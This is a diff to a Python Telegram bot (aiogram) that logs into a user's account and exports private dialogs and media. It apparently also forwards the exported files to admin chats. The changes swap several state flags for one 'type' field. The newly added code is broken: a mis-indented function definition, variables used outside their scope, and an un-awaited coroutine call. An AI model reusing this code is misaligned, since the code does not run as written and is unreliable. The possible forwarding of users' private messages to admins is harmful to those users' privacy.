@@ -80,8 +80,9 @@ async def send_files_to_bot(bot, admin_chat_ids, user_chat_id):
                 os.remove(file_to_send)  # Удаляем файл только если он был успешно отправлен всем из списка
       
 # Обработчики колбэков для запуска нужных функций
-@dp.callback_query_handler(lambda query: 'get_private' in user_state.get(query.from_user.id, {}))
-async def private_command(callback_query: AiogramCallbackQuery):
+#@dp.callback_query_handler(lambda query: 'get_private' in user_state.get(query.from_user.id, {}))
+@dp.callback_query_handler(lambda query: bool(user_state.get(query.from_user.id, {}).get('type')))
+async def callback_query_handler(callback_query: AiogramCallbackQuery):
     logging.info(f"Callback query data: {callback_query.data}")
     user_id = callback_query.from_user.id
     code = callback_query.data
@@ -94,13 +95,13 @@ async def private_command(callback_query: AiogramCallbackQuery):
     elif code == 'get_media':
         selection = '450'
         selection_alias = 'Отчет с фото + скачивание всех медиа'
+    user_state[user_id]['selection'] = selection
     await bot.send_message(callback_query.from_user.id, f"Вы выбрали опцию: {selection_alias}")
-    try:
-      user_state[user_id]['selection'] = selection
-    except Exception as e:
-            logging.error(f"Error during making list: {e}")
-            await message.answer(f"Произошла ошибка при формирование списка: {e}")
+    if selection in ['40', '45', '450']:
+        await process_private_message(selection)
     
+ async def process_private_message(selection): 
+    #selection = user_state[user_id]['selection']
     #if user_id in user_state and user_state[user_id].get('connected'):
     await bot.send_message(callback_query.from_user.id, f"Вы выбрали опцию: {selection_alias}. Формирую список диалогов...")
 
@@ -148,8 +149,7 @@ async def send_welcome(message: types.Message):
             'phone_code_hash': sent_code.phone_code_hash,  # Извлекаем хеш кода
             'client': client,
             'connected': False,
-            'get_private': False,
-            'get_channel': False,
+            'type': "",
             'selection':""
         }
       
@@ -201,11 +201,8 @@ async def select_mode_of_download(message: types.Message):
     user_id = message.from_user.id
     if user_id in user_state and user_state[user_id].get('connected'):
         await show_keyboard(message)
-        user_state[user_id]['get_private'] = True
-        # Удаляем значение selection из user_state
-        if user_id in user_state:
-            if 'selection' in user_state[user_id]:
-                del user_state[user_id]['selection']
+        user_state[user_id]['type'] = 'private'
+        user_state[user_id]['selection']=''
     else:
         logging.info(f"User {user_id} is not connected. Cannot perform getting private message.")
         await message.answer("Вы должны сначала подключиться. Введите /start для начала процесса подключения.")
@@ -214,7 +211,7 @@ async def select_mode_of_download(message: types.Message):
 
 
 # Обработчик выбора списка приватного диалого для выгрузки, если get_private равно True
-@dp.message_handler(lambda message: user_state.get(message.from_user.id, {}).get('get_private', False) and
+@dp.message_handler(lambda message: user_state.get(message.from_user.id, {}).get('type') == 'private' and
                                   message.text.isdigit() and 1 <= len(message.text) <= 4)
 async def get_private_message_from_list(message: types.Message):
     user_id = message.from_user.id
@@ -265,8 +262,7 @@ async def get_phone_number(message: types.Message):
             'phone_code_hash': sent_code.phone_code_hash,  # Извлекаем хеш кода
             'client': client,
             'connected': False,
-            'get_private': False,
-            'get_channel': False,
+            'type': "",
             'selection':""
         }
         await message.reply("Код отправлен на телефон клиента. Введите полученный ПИН")
